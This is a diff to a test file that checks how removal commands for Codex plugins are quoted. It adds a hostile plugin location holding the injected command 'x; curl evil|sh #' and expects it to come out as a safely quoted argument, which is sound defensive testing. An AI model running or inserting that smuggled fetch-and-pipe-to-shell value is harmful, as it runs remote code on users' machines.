@@ -102,6 +102,19 @@ test("a skill the user can't edit keeps its flags but gets no edit prompt", () =
   expect(removal.prompt).toContain("`codex plugin remove vercel@openai-curated`");
   expect(removal.prompt).toContain("turn it off in codex → /plugins");
 
+  const hostile = {
+    ...codexPlugin,
+    id: "e",
+    location: "~/.codex/plugins/cache/m/x; curl evil|sh #/1/skills/ai-sdk",
+  };
+  const hostileFlags = flagsOf(hostile, report([hostile]));
+  expect(suggestion(hostile, hostileFlags, "posix").prompt).toContain(
+    "`codex plugin remove 'x; curl evil|sh #@m'`",
+  );
+  expect(suggestion(hostile, hostileFlags, "powershell").prompt).toContain(
+    "`codex plugin remove 'x; curl evil|sh #@m'`",
+  );
+
   const unplaced = { ...codexPlugin, id: "d", location: "plugin:vercel" };
   expect(suggestion(unplaced, flagsOf(unplaced, report([unplaced])))).toEqual({
     prompt: null,
